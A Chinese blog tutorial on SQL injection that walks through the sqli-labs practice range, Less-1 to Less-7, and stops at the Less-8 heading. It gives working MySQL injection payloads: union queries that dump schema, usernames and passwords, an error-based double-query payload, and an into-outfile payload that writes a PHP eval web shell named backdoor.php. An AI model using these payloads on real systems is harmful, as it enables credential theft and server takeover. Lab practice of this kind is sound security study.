SQL注入攻击 SQL injection attack

SQL Injection
Web
发布日期:   2021-06-07
文章字数:   1.5k
阅读时长:   6 分
阅读次数:  

什么是SQL注入？

SQL注入作为网络世界中最常见的攻击手段，想必大家多少有听过某某学长某某同学，修改了学校的数据库，修改了自己的成绩，修改了自己的饭卡权限…等等，在最常见Web攻击手段里，SQL注入首当其冲。


简单的来说，SQL注入是恶意用户通过篡改SQL查询语句，以通过非正常手段获取到自己需要的数据的一种方式。

在学习注入攻击之前你应该先有以下储备知识：

  • PHP基础
  • PHP连接数据库函数
  • SQL基本语句

在已有以上基础后可以知道PHP连接操作MySQL数据库时使用的sql语句通常是储存在变量内的，而我们通过网页提交的非法数据造成了语句的截断，例如PHP页面为 

$sql = "select user from student where name = '$name' and password=$pswd"

而$name数据如果是由前端提交的，如下表单

<form method="#" action="GET">
    <input type="text" name="name" value="yinyin">
    <input type="password" name="pswd">
    <input type="submit" name="submit">
</form>

此时我们在 input标签内输入的name会被传入到后台处理 我们传入构造的非法字符串1' or 1=1 '#

PHP在接受恶意参数后，此时的SQL语句已经被我们篡改，便造成了网页的SQL注入

$sql = "select user from student where name = '1' or 1=1 # and password=$pswd"

环境介绍

本次学习使用渗透测试靶场sqli-labs，服务器环境为PHP+MySQL

下载地址：

  • phpstudy

  • sqli-labs

搭建环境中请使用PHP7以下的版本，MySQL使用5.5以上版本

实战思路

Less-1

GET - Error based - Single quotes - String

基于错误 - 单引号字符型

排除数值型注入：
?id=1' and 1 = 1 # 	//页面正常回显
?id=1' and 1 = 2 # 	//页面正常回显

判断为字符型注入：
?id=1'		//页面报错
?id=1' --+	//页面正常回显

判断列长度为 3：
?id=1' order by 4 //页面报错
?id=1' order by 3 //页面正常回显

判断页面回显结果位置： （传入不存在的id数值）
?id=77' union select 1,2,3--+

在判断完基本信息后我们需要对目标数据库具体库、表、字段、数据进行猜解

引入知识点：利用information_schema获取目标数据库数据

查询数据库:

查看当前网页调用的数据库：
?id=77' union select 1,2,database()--+

查看所有的数据库：
?id=77' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+

查询数据表:

查询当前数据库下所有的表：
?id=77' union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()--+

查询字段:

查询users表内所有字段：
?id=77' union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=database() and TABLE_NAME='users'--+

查询数据:

查询username以及password字段下所有数据：
?id=77' union select 1,group_concat(username),group_concat(password) from users--+

Less-2

Error based- Intiger based

基于错误 - 整形

这里与Less1不同的地方是变量并没有使用双引号定义，此时的变量id为整型数据

判断为整型注入
1 and 1=1		//页面正常显示
1 and 1=2		//页面无法显示

在确定注入类型后再用常用的步骤尝试注入即可 需要注意的就是此时传入的变量后不需要使用引号闭合

?id=77 union select 1,group_concat(username),group_concat(password) from users--+

Less-3

GET - Error based- Single quotes with twist - string

基于错误 - 单引号变型字符型

观察注入点以及报错信息，判断注入点有括号闭合 构建SQL语句 后续步骤同上

判断注入点是否存在：
?id=1') and 1=1 --+		//页面正常显示
?id=1') and 1=2 --+		//页面无法显示

Less-4

GET - Error based- Double Quotes - string

基于错误 - 双引号字符型

同样观察注入点，注入点参数用双引号闭合，构建闭合语句 后续步骤同上

判断注入点是否存在：
?id=1") and 1=1 --+		//页面正常显示
?id=1") and 1=2 --+		//页面无法显示

Less-5

GET - Double Injection - Single Quotes - String

双注入GET单引号字符型注入

这里的SQL语句与Less-1相同，不同的是传入id参数后，页面返回的值固定是'You are in…………'而不会返回查询到的结果，这个时候我们使用SQL注入 双查询注入，可以使查询结果的一部分通过报错的形式显示出来

获取密码payload

?id=-1' union select count(*),1, concat((select password from users LIMIT 0,1),floor(rand()*2)) as a from information_schema.tables group by a --+

Less-6

GET - Double Injection - Double Quotes - String

双注入GET双引号字符型注入

与第五题同理 只需要修改payload内单引号为双引号即可

Less-7

GET - Dump into outfile - String

导出文件GET字符型注入

判断注入点结构为(('$id'))：
?id=1')) and 1=1 --+		//页面显示正常
?id=1')) and 1=2 --+		//页面显示出错

根据题目名称into outfile 联想到mysql命令 select into oufile

标准语句：

select 数据 into outfile 导出路径;

要注意的是select into outfile在使用时候需要满足

  • 需要知道MySQL服务器本地路径
  • 配置文件中需要设置允许上传的路径 secure-file-priv=路径

假设本地服务器路径为 F:/WebSRC/sqli-labs-master同理利用联合查询构建payload上传后门文件

?id=1')) union select 1,2,'<?php @eval($_REQUEST[pass]);?>' into outfile 'F:/WebSRC/sqli-labs-master/backdoor.php' --+

在网站根目录下访问上传的文件backdoor.php即可

Less-8

GET - Blind - Boolian Based - Single quotes

布尔型单引号GET注入
